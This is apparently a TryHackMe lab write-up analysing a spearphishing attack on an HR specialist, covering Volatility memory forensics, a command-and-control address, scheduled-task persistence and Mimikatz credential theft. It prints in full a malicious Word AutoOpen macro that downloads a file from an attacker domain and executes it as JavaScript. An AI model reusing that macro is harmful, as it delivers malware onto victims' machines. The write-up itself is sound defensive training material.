---
{"dg-publish":true,"permalink":"/mitreattck-analysis/tryhackme/spearphishing-by-threat-group-boogeyman/"}
---

[[]]
### Case Description
---
A spearphishing attack performed by threat group named Boogeyman on human resource specalist, the attacker performed OSINT on the company and found out there is an open position so they sent a crafted email to the human resource.
## Tools
---
- Volatility - for volatile memory analysis.
- Olevba - for analysing and extracting VBA macros from MS documents.

# Analysis

Screenshot of the email:

![Pasted image 20240922160400.png](/img/user/x/images/Pasted%20image%2020240922160400.png)
- Sender: westaylor23@outlook[.]com
- Receiver: maxine[.]beck@quicklogisticsorg[.]onmicrosoft[.]com
- Attachment: Resume_WesleyTaylor.doc
	- Hash: 52c4384a0b9e248b95804352ebec6c5b 
	- VirusTotal score is 41/65.

```vb
Sub AutoOpen()

spath = "C:\ProgramData\"
Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png", False
xHttp.Send
With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile spath & "\update.js", 2
End With

Set shell_object = CreateObject("WScript.Shell")
shell_object.Exec ("wscript.exe C:\ProgramData\update.js")

End Sub
```

1. Makes a GET request to files[.]boogeymanisback[.]lol domain `update.png`.
2. Then renamed the file as `update.js`.
3. Creates `Wscript.Shell` to execute VBscript files this case it is javascript.
#### Memory Analysis
---
Listing all process captured:

```
vol -f <file> windows.pslist > pslist.txt 
```

Command output:
![Pasted image 20240922162118.png](/img/user/x/images/Pasted%20image%2020240922162118.png)
Then using the process ID of wscript.exe which is 4260 on the same file replacing 'wscript' with the PID:

![Pasted image 20240922162307.png](/img/user/x/images/Pasted%20image%2020240922162307.png)
Checking for network connection using `windows.netscan` and saving it to file to check for network activities related to PID 6216 (updater.exe):

![Pasted image 20240922163319.png](/img/user/x/images/Pasted%20image%2020240922163319.png)
- 128.199.95.189: 8080 is most likely the command and control of the threat group.
- `filescan` plugin reveals the full path of **updater.exe** in `C:\Windows\Tasks\updater.exe`

![Pasted image 20240922164647.png](/img/user/x/images/Pasted%20image%2020240922164647.png)
The malicious attachment is found on:

```C
C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor.doc
```

Then viewing the command line, we see this with plugin `windows.cmdline`:

![Pasted image 20240922165130.png](/img/user/x/images/Pasted%20image%2020240922165130.png)
Dumping memory map of process 4464 with the command:

```
vol -f WIN.dmp windows.memmap --pid 4464 --dump
```

Command output:

![Pasted image 20240922172441.png](/img/user/x/images/Pasted%20image%2020240922172441.png)
So it is most likely the attacker used `schtasks` to schedule their persistence:

```
strings <file.raw> | grep "schtasks"
```

Command Output:

![Pasted image 20240922172933.png](/img/user/x/images/Pasted%20image%2020240922172933.png)
Mimikatz is found and installed on the machine using the filter `event.code: 1 and "github.com"`:

![Pasted image 20240924174632.png](/img/user/x/images/Pasted%20image%2020240924174632.png)
Same filter but replace 'github.com' with `mimikatz.exe`, shows the credentials used:

![Pasted image 20240924175215.png](/img/user/x/images/Pasted%20image%2020240924175215.png)
We can see that the user dumped credentials and used it to gain access to another machine which is **itadmin** machine:

![Pasted image 20240924175630.png](/img/user/x/images/Pasted%20image%2020240924175630.png)
Searching for the keyword `ls` which is short for listing directories shows this:

![Pasted image 20240924185445.png](/img/user/x/images/Pasted%20image%2020240924185445.png)
And then searching for 'ITFiles' without other filters:

![Pasted image 20240924185535.png](/img/user/x/images/Pasted%20image%2020240924185535.png)
Based on the previous `mimikatz.exe` log entries sorted by timestamp, we can see two more users these are 'itadmin' and 'allan.smith' so we can search for 'allan.smith' and find this:

![Pasted image 20240924194127.png](/img/user/x/images/Pasted%20image%2020240924194127.png)





